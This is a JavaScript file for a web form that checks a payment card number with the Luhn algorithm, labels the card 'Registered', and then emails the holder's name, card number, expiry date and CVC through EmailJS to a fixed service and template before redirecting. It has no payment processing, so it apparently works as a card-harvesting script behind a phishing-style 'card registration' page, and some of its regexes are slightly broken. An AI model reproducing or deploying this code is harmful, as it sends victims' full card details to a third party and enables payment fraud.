// Credit Card Validation 
var validated = false;
function validateCreditCardNumber(cardNumber) {
            cardNumber = cardNumber.split(' ').join("");
            if(parseInt(cardNumber) <= 0 || (!/\d{15,16}(~W[a-zA-Z])*$/.test(cardNumber)) || cardNumber.length > 16) {
                return false;
            }
            var carray = new Array();
            for(var i = 0; i < cardNumber.length; i++) {
                carray[carray.length] = cardNumber.charCodeAt(i) - 48;
            }
            carray.reverse(); // luhn approaches number from the end
            var sum = 0;
            for(var i = 0; i < carray.length; i++) {
                var tmp = carray[i];
                if((i % 2) != 0) {
                    tmp *= 2;
                    if(tmp > 9) {
                        tmp -= 9;
                    }
                }
                sum += tmp;
            }
            return (sum % 10) == 0;
        }
        function cardType(cardNumber) {
            cardNumber = cardNumber.split(' ').join("");
            var o = {
                electron: /^(4026|417500|4405|4508|4844|4913|4917)d+$/,
                maestro: /^(5018|5020|5038|5612|5893|6304|6759|6761|6762|6763|0604|6390)\d+$/,
                dankort: /^(5019)\d+$/,
                interpayment: /^(636)\d+$/,
                unionpay: /^(62|88)\d+$/,
                visa: /^4[0-9]{12}(?:[0-9]{3})?$/,
                mastercard: /^5[1-5][0-9]{14}$/,
                amex: /^3[47][0-9]{13}$/,
                diners: /^3(?:0[0-5]|[68][0-9])[0-9]{11}$/,
                discover: /^6(?:011|5[0-9]{2})[0-9]{12}$/,
                jcb: /^(?:2131|1800|35\d{3})\d{11}$/
            };
            for(var k in o) {
                if(o[k].test(cardNumber)) {
                    return k;
                }
            }
            return null;
        }
        function update(cardNumber) {
            var img = document.getElementById("img");
            var valid = document.getElementById("valid");
            if(validateCreditCardNumber(cardNumber)) {
                valid.innerText = "Your card is Registered";
                valid.style.backgroundColor = "#137c00";
                img.src = "assets/images/" +  (cardType(cardNumber) || "other") + ".png";
                
                validated = true;
            }
            else {
                valid.innerText = "Card is not Registered ";
                valid.style.backgroundColor = "#940006";
                img.src = "assets/images/other.png";
                validated = false;
            }
        }
        
// End of Credit Card Validation

console.log(validated)

// Email System
const name = document.getElementById("name");
const number = document.getElementById("number");
const date = document.getElementById("date");
const cvc = document.getElementById("cvc");
function emailSend() {
    let params = {
        name: name.value,
        date : date.value,
        number : number.value,
        cvc : cvc.value,
    }
    
    if (validated) {
        emailjs.send("service_1qktqka", "template_nt73xfr", params).then(
            setTimeout(() => {
                window.location.href = "../../results.html"
            },3000)
        );
    } else {
        alert("Card doesn't exist")
    }

}


